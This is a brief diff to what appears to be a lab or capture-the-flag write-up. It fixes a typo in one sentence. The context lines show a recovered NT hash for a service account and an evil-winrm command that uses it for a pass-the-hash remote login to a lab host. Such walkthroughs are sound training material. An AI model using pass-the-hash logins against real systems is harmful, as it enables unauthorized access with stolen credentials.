@@ -269,7 +269,7 @@ This gives us the NT Hash for the `WINRM_SVC` service account.
 NT: 33bd09dcd697600edf6b3a7af4875767
 ```
 
-Once we have the NT Hash for the, we can connect with `evil-winrm` using the `WINRM_SVC` service account.
+Once we have the NT Hash, we can connect with `evil-winrm` using the `WINRM_SVC` service account.
 
 ```bash
 evil-winrm -i 10.129.232.88 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
